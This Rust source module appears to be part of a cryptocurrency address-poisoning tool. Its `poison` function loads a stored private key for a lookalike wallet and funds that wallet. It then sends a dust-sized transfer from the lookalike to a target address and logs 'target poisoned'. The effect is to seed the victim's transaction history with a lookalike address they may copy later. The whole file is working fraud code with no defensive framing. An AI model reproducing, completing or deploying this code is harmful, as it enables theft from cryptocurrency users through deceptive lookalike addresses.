use crate::config::Config;
use crate::providers::{get_http_provider, HttpProvider};
use crate::utils::get_identifier;
use alloy::network::EthereumWallet;
use alloy::primitives::{Address, U256};
use alloy::providers::{Provider, WalletProvider};
use alloy::rpc::types::TransactionRequest;
use alloy::serde::WithOtherFields;
use alloy::signers::local::PrivateKeySigner;
use log::info;
use rocksdb::{DBWithThreadMode, SingleThreaded};
use std::ops::{Add, Mul};
use std::str::FromStr;
use std::sync::Arc;

async fn send_transaction(http_provider: &HttpProvider, to: &Address, value: &U256) {
    let transaction = TransactionRequest::default().to(*to).value(*value);

    let pending = http_provider
        .send_transaction(WithOtherFields::from(transaction))
        .await
        .unwrap();

    let receipt = pending.get_receipt().await.unwrap();
}

pub(crate) async fn poison(
    config: Arc<Config>,
    db: Arc<DBWithThreadMode<SingleThreaded>>,
    http_provider: Arc<HttpProvider>,
    from: Address,
    to: Address,
) {
    let identifier = get_identifier(&config, &from);

    let bytes = db.get(identifier).unwrap().unwrap();
    let string = String::from_utf8(bytes).unwrap();

    let temp_private_key_signer = PrivateKeySigner::from_str(&string).unwrap();
    let temp_ethereum_wallet = EthereumWallet::from(temp_private_key_signer);
    let temp_http_provider = get_http_provider(temp_ethereum_wallet, &config.http_url);

    let first_to = temp_http_provider.default_signer_address();
    let last_to = to;

    let value_without_fees = U256::ONE.mul(U256::from(10).pow(U256::from(10)));
    let fees = U256::from(25).mul(U256::from(10).pow(U256::from(10)));
    let value_with_fees = value_without_fees.add(fees);

    send_transaction(&http_provider, &first_to, &value_with_fees).await;
    send_transaction(&temp_http_provider, &last_to, &value_without_fees).await;

    info!("target poisoned | address {:?}", to);
}
